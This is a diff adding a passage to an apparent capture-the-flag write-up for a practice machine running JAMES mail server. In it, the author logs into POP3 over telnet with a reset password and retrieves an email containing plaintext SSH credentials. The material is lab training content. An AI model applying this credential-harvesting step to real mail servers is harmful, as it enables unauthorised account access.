@@ -253,4 +253,77 @@ Password for mindy reset
 
 The password was successfully changed.
 
+At this point, we can try to log into `POP3` service with those credentials.
 
+To connect, we will use `telnet` again:
+
+<br />
+
+```bash
+❯ telnet 10.10.10.51 110
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+USER mindy
++OK
+PASS test123
++OK Welcome mindy
+```
+
+<br />
+
+It works.
+
+Now, we can list the available mails for this user:
+
+<br />
+
+```bash
+LIST
++OK 2 1945
+1 1109
+2 836
+```
+
+<br />
+
+There are two mails.
+
+The first one, doesn't have relevant information.
+
+On the other hand, the second mail contains a plaintext password:
+
+<br />
+
+```bash
+RETR 2
++OK Message follows
+Return-Path: <mailadmin@localhost>
+Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+          for <mindy@localhost>;
+          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+```
+
+<br />
